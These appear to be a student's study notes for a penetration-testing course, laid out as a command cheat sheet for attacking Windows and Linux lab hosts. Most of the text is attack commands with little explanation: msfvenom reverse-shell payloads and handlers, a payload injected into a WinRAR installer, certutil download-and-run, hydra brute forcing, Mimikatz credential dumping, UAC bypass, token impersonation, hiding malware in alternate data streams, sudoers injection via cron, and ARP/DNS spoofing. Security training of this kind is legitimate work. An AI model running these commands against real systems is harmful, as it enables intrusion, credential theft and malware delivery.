# System/Host Based Attacks
## Windows
### Windows Vulnerabilities
**Exploiting WebDAV with Metasploit**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -f asp > shell.asp
cadaver http://1.1.1.1/webdav
put /root/shell.asp
service postgresql start

use multi/handler
set payload windows/meterpreter/reverse_tcp

sysinfo
getuid

search iis upload
```

**Exploiting SMB with PsExec**
PsExec is lightweight telnet replacement. Similar to RDP, but command line.
```
search smb_login
set USER_FILE ...wordlist
set PASS_FILE ...wordlist

psexec.py Administrator@1.1.1.1 cmd.exe

MSF: search psexec
```

**EternalBlue**
Use metasploit on SMBv1.

**Exploiting RDP**
Default port is 3389, but often on other ports. Check ports with MSF.
```
search rdp_scanner

hydra -L ...common_users -P ...unix_passwords rdp://1.1.1.1 -s 3333
xfreerdp /u:administrator /p:qwertyuiop /v:1.1.1.1:3333
```

**BlueKeep**
RDP vulnerability. Use metasploit.

**Exploiting WinRM**
Typically on ports 5985 or 5986.
```
crackmapexec winrm 1.1.1.1 -u administrator -p ...unix_passwords
crackmapexec winrm 1.1.1.1 -u administrator -p tinkerbell -x "systeminfo"

evil-winrm.rb -u administrator -p 'tinkerbell' -i 1.1.1.1

search winrm_script
set FORCE_VBS true
```

### Windows Privilege Escalation
**Windows Kernel Exploits**
Windows-Exploit-Suggester and Windows-Kernel-Exploits.
```
Meterpreter: getsystem

MSF (automatic): search suggester

shell
systeminfo
Copy-paste information to txt file in kali
./windows-exploit-suggester.py --update --database 2021...xls --systeminfo win7.txt
Download binary for exploit

cd C:\\Temp\\
upload ~/Downloads/41015.exe
.\41015.exe 7
whoami
```

**Bypassing UAC with UACMe**
```
search rejetto
sysinfo
pgrep explorer
migrate 2448
sysinfo
getuid
getprivs
shell
net user
net localgroup administrators
net user admin password123

msfvenom -p ...reverse_tcp LHOST=2.2.2.2 LPORT=1234 -f exe > backdoor.exe

use multi/handler
set payload ...reverse_tcp

cd C:\\
mkdir Temp
cd Temp
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
.\Akagi64.exe 23 C:\Temp\backdoor.exe

getprivs
ps
migrate 688
getuid
```

**Access Token impersonation**
```
search rejetto
sysinfo
pgrep explorer
migrate 3512
getuid
getprivs

load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
pgrep explorer
migrate 2512
getprivs
```

**Alternate Data Streams (ADS)**
Hide malware in resource stream (metadata). Evade basic signature based AVs or static analysis. 
```
type payload.exe > windowslog.txt:winpeas.exe
notepad windowslog.txt
start windowslog.txt:winpeas.exe
cd \
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
wupdate
```

### Windows Credential Dumping
**Windows Password Hashes**
- SAM database (Security Account Manager)
- Encrypted with a syskey
- Elevated privileges are required to interact with LSASS process
- LM (LanMan)
- NTLM (NTHash)

**Searching for passwords in Windows configuration files**
- Unattended Windows Setup utility
	- Panther\Unattend.xml
	- Panther\Autounattend.xml

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST.. LPORT.. -f exe > payload.exe
python -m SimpleHTTPServer 80
^Would be better to use exploit to get meterpreter

search -f Unattend.xml
cd C:\\Windows\\Panther
dir
download unattend.xml
base64 -d password.txt
psexec.py Administrator@1.1.1.1
```

**Dumping hashes with Mimikatz**
Extract hashes from the lsass.exe process memory where hashes are cached. Can use Kiwi extension in meterpreter. Requires privileges.
```
search badblue
pgrep lsass
migrate 788
load kiwi
creds_all
lsa_dump_sam

upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
.\mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
```

### Exploiting Linux vulnerabilities
**Exploiting FTP**
```
hydra -L ...common_users -P ...unix_passwords 1.1.1.1 -t 4 ftp
ftp 1.1.1.1
dir
get secret.txt

searchsploit ProFTPd
```

**Exploiting SSH**
```
hydra ...
ssh sysadmin@1.1.1.1
```

**Exploiting SAMBA**
```
hydra ...
smbmap -H 1.1.1.1 -u admin -p password1
smbclient //1.1.1.1/share -U admin
get flag

enum4linux -a 1.1.1.1 -u admin -p password1
```

### Linux Privilege Escalation
**Linux Kernel Exploits**
Linux-Exploit-Suggester tool
```
sysinfo
getuid
> Download LES
cd /tmp
upload les.sh
shell
chmod +x les.sh
./les.sh
> Download exploit code
sudo apt-get install gcc
upload dirty.c
> Compile code
shell /bin/bash -i
chmod +x dirty
./dirty
ssh firefart@1.1.1.1
cat /etc/shadow
```

**Exploiting misconfigured cron jobs**
Find cron jobs scheduled by the root user
```
crontab -l
cd /
grep -rnw /usr -e "/home/student/message"
cat /tmp/message
ls -al /usr/local/share/copy.sh

printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
sudo -l
```

**Exploiting SUID binaries**
Factors: SUIB binary owned by root user, and access to execute binary.
```
file welcome
strings
rm greetings
cp /bin/bash greetings
```

### Linux Credential Dumping
**Dumping Linux password hashes**
Determine hashing algorithm by the dollar symbol.
```
> Exploit with msf
sessions -u 1
cat /etc/shadow

search hashdump
```

# Network-Based Attacks
### Networking
**Firewall detection & IDS evasion**
```
> Detect the presence of a firewall (filtered)
nmap -Pn -sA -p445,3389 1.1.1.1
> Fragmentation 
nmap -Pn -sS -sV -p80,445,3389 -f --mtu 8 1.1.1.1
> Decoy as gateway IP with custom port (DNS server 53)
nmap -Pn -sS -sV -p80,445,3389 -f --data-length 200 -g 53 -D 1.1.1.1 1.1.1.88
```

### Network attacks
**SMB & NetBIOS enumeration**
- NetBIOS is an API. Name service, datagram service and session service. Typically ports 137, 138 and 139 over UDP and TCP.
- SMB is network file sharing protocol. Inter-process communication (IPC). SMB v1, v2.0/2.1, v3.0+
- Generally port 445 and port 139.
- Modern networks use DNS instead of NetBIOS, but often enabled together for backward compatibility.
```
nbtscan 1.1.1.0/20
nmblookup -A 1.1.1.1
nmap -sU -p 137 1.1.1.1
nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n 1.1.1.1
> None of the above works?

nmap -p445 --script smb-protocols 1.1.1.1
--script smb-security-mode
smbclient -L demo.ine.local
nmap -p445 --script smb-enum-users demo.ine.local
nano users.txt
hydra -L users.txt -P ...unix_passwords demo.ine.local smb
psexec.py administrator@demo.ine.local

search psexec

run autoroute -s 1.1.1.0/20
background
search socks
set VERSION 4a
set SRVPORT 9050
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
sessions 2

migrate -N explorer.exe
shell
net view 1.1.1.1
net use D: \\demo1.ine.local\Documents
net use K: \\demo1.ine.local\K$
dir D:
```

**SNMP enumeration**
- Simple Network Management Protocol
- Typically uses UDP
- Manager and Agent
- Management Information Base (MIB)
- v1, v2c and v3
- Ports 161 and 162
```
nmap -sU -sV -p161 demo.ine.local
nmap -sU -sV -p161 --script snmp-brute demo.ine.local
snmpwalk -v 1 -c public demo.ine.local
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_info
hydra -l administrator -P ...unix_passwords demo.ine.local smb
```

**SMB relay attack**
Interceptions, capturing authentication, relaying to a legitimate server, gain access.
```
search smb_relay
set SRVHOST 2.2.2.2
set LHOST 2.2.2.2
set SMBHOST 1.1.1.10

echo "2.2.2.2 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 1.1.1.5 1.1.1.1
arpspoof -i eth1 -t 1.1.1.1 1.1.1.5
```

# The Metasploit Framework
https://github.com/penetration-testing-execution-standard/ptes
```
systemctl enable postgresql
systemctl start postgresql
systemctl status postgresql
msfdb init

db_status
```
Some commands:
```
connect
workspace

```

### Client-side attacks
**Generating payloads with Msfvenom**
```
msfvenom --list payloads
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -f exe > /home/kali/Desktop/payloadx86.exe
msfvenom --list formats
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -f elf > /home/kali/Desktop/payloadx86
chmod +x payloadx86

sudo python -m SimpleHTTPServer 80
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
```

**Encoding payloads with Msfvenom**
```
msfvenom --list encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodedx86.exe
```

**Injecting payloads into Windows portable executables**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downloads/wrar602.exe > /home/kali/Desktop/winrar.exe
run post/windows/manage/migrate
```

### Automating
**Automating Metasploit with resource scripts**
```
ls -al /usr/share/metasploit-framework/scripts/resource

nano handler.rc
use multi/handler
set PAYLOAD ...
run

msfconsole -r handler.rc

resource handler.rc

makerc /home/kali/Desktop/portscan.rc
```

### Exploitation
**Exploiting a vulnerable HTTP file server**
```
search rejetto
> can set payload to architecture too
```

**Exploiting WinRM**
```
search winrm
winrm_auth_method, winrm_login, winrm_cmd, winrm_script
set FORCE_VBS true
```

**Exploiting a vulnerable Apache Tomcat web server**
```
search tomcat_jsp
set payload java/jsp_shell_bind_tcp
set SHELL cmd

msfvenom -p windwos/meterpreter/reverse_tcp LHOST.. LPORT... -f exe > meterpreter.exe
sudo python -m SimpleHTTPServer 80

certutil -urlcache -f http://2.2.2.2/meterpreter.exe meterpreter.exe

nano handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
LHOST.. LPORT...
run

.\meterpreter.exe
```

### Linux exploitation
**Exploiting a vulnerable FTP server**
```
search vsftpd
/bin/bash/ -i
search shell_to_meterpreter
set LHOST eth1
set SESSION 1
```

**Exploiting Samba**
```
search samba/is_known_pipename
check

search shell_to_meterpreter
```

**Exploiting a vulnerable SSH server**
```
search libssh_auth_bypass
set SPAWN_PTY true
cat /etc/*release
uname -r
search shell_to_meterpreter
```

**Exploiting a vulnerable SMTP server**
```
search haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set LHOST eth1
```

## Exploitation
### Post exploitation fundamentals
**Meterpreter fundamentals**
```
getuid
background
sessions -h

edit flag2
download flag5.zip
checksum md5 /bin/bash
getenv PATH
search -d /usr/bin -f *backdoor*
search -f *.jpg

cmd

ps
migrate 123

execute -f ifconfig
```

**Upgrading command shells to meterpreter shells**
```
search shell_to_meterpreter
set SESSION 1
set LHOST eth1

sessions -u 1
```

### Windows Post Exploitation
**Windows post exploitation modules**
```
search rejetto

sysinfo
getuid
help
getsystem
getuid
show_mount
ps
migrate 2212
cd C:\\
download flag.txt

search migrate
use post/windows/manage/migrate
search win_privs
search enum_logged_on
search checkvm
search enum_applications
search type:post platform:windows enum_av
search enum_computer
search enum_patches (systeminfo manually in session if this fails)
search enum_shares

search enable_rdp

loot
```

**Bypassing UAC**
User Account Control is a Windows security feature.

```
> after exploit
shell
net users
net localgroup administrators

search bypassuac
set LPORT 4433
set TARGET Windows\ x64
set PAYLOAD windows/x64/meterpreter/reverse_tcp

getsystem
getuid
hashdump
```

**Token impersonation with incognito**
Windows access tokens are created and managed by the Local Security Authority Subsystem Service (LSASS). Generated by winlogon.exe process every time a user authenticates successfully. Attached to userinit.exe process. Child processes started by user will inherit a copy of the access token and run under these privileges. Security levels: impersonate-level and delegate-level. Non-interactive vs. interactive login.
Must have SeImpersonatePrivilege. 
```
>after exploit
getprivs
load incognito
list_tokens -u
impersonate_token <...>
ps 
migrate <explorer.exe>
hashdump
```

**Dumping hashes with Mimikatz**
Mimikatz post-exploit tool to extract plaintext credentials from memory, password hashes from local SAM databases etc. Security Account Manager database.
```
>after exploit
pgrep lsass
load kiwi
help
creds_all
lsa_dump_sam
lsa_dump_secrets
```
Can also upload mimikatz and use executable directly in shell instead of meterpreter kiwi commands.


